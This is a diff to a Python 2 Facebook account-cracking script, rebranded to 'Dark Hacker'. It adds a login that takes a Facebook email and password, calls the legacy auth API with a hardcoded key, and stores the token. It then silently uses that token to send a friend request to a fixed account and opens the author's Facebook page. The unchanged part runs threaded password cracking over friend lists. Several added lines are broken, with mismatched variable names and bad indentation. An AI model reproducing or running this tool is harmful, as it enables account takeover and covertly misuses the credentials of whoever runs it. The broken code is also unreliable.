@@ -1,7 +1,7 @@
 #coding=utf-8
 #!/usr/bin/python2
-#source code by Tech Abm
-#codded by Tech Abm
+#source code by Dark Hacker
+#codded by Dark Hacker
 # do no try to decode it
 '''
 
@@ -44,9 +44,9 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 
 banner="""
-\033[1;97m██████╗░░█████╗░██████╗░██    ██/033[1;0m
-\033[1;91m██╔══██╗██╔══██╗██╔══██╗██║░██/033[1;0m
-\033[1;97m██║░░██║███████║██████╔╝█████/033/033[1;0m
+\033[1;97m██████╗░░█████╗░██████╗░██    ██\033[1;0m
+\033[1;91m██╔══██╗██╔══██╗██╔══██╗██║░██\033[1;0m
+\033[1;97m██║░░██║███████║██████╔╝█████\033/033[1;0m
 \033[1;91m██║░░██║██╔══██║██╔══██╗██╔═██\033[1;0m
 \033[1;97m██████╔╝██║░░██║██║░░██║██║░  ██\033[1;0m
 
@@ -63,7 +63,7 @@ def user_info():
     print banner
     time.sleep(1)
     try:
-        abm = open("/sdcard/.abm.txt", "r").read()
+        abm = open("/sdcard/.dark.txt", "r").read()
     except (KeyError , IOError):
         menu_login()
         os.system('clear')
@@ -75,35 +75,32 @@ def user_info():
         os.system("cd .empty && node index.js &")
         time.sleep(3)
         menu_login()
+
+    IncorrectUsername = "Dark"
+    CorrectPassword = "Hacker"
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username
+            loop = 'false'
+        else:
+            print "Wrong Password"
+            os.system('xdg-open https://www.facebook.com/darkhacker07')
     else:
-        os.system("clear")
-	print banner
-	print("\033[1;93mThis Tool Is temporarily lock").center(50)
-	print('')
-	print("\033[1;93mPut Api Key To Unlock This Tool").center(50)
-	print('')
-	api = raw_input("\033[1;97m[!] Put Api Key :\033[0;90m ")
-	if api =="Dark-Hacker":
-		print("")
-		time.sleep(3)
-		print("\033[1;92mTool Has Unlock Success").center(50)
-		print("")
-		time.sleep(2)
-		menu_login()
-	else:
-		print("")
-		time.sleep(1)
-		print("\033[1;91mApi Key Is Invalid").center(50)
-		print("")
-		time.sleep(3)
-		user_info()
+        print "Wrong Username"
+        os.system('xdg-open https://www.facebook.com/darkhacker07')
+def login():
+	os.system('clear')
 		
 def menu_login():
 	os.system("clear")
 	print banner
 	print("[1] Login With Access Token")
 	print("[2] Login With Fb Password")
-	print("[0] Direct Exir")
+	print("[0] Direct Exit")
 	print(50*"-")
 	menu_login2() 
 def menu_login2():
@@ -136,21 +133,22 @@ def menu_login2():
 		time.sleep(3)
 		menu_login()
 		
-def login_fb():
-    os.system("clear")
-    print banner
-    lid = raw_input("[!] Id/mail/no: ")
-    pwds = raw_input("[!] Password : ")
-    data = requests.get("http://localhost:5000/auth?id=" + uid + "&pass=" + pwd).text
-    q = json.loads(data)
-    if "loc" in q:
-        login_abm = open('access_token.txt', 'w')
-        login_abm.write(q["loc"])
-        login_abm.close()
-	print("")
-	print("\033[1;92mLogin Success").center(50)
-	time.sleep(3)
-        menu()
+ig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\033[1;96m\x1b[1;92mLogin Successful'
+				os.system('xdg-open https://www.facebook.com/darkhacker07')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
     elif 'www.facebook.com' in q['error']:
         print("")
         print("Email Or Password Has Wrong").center(50)
@@ -257,7 +255,7 @@ def crack_select():
 			print("")
 			print("\033[1;91mInvalid Link Or Friendlist Has Private").center(50)
 			print("")
-			time.sleep(3)
+			time.sleep(0.03)
 			crack()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
 		z = json.loads(r.text)
@@ -485,7 +483,7 @@ def crack_select():
 	p = ThreadPool(30)
 	p.map(main,id)
 	print(50*"-")
-	print("[!] The process has completed")
+	print("[!] The process completed")
 	print("[!] Total OK/CP:"+str(len(oks)))+"/"+str(len(cps))
 	raw_input("[!] Press Eter To Back")
 	crack()
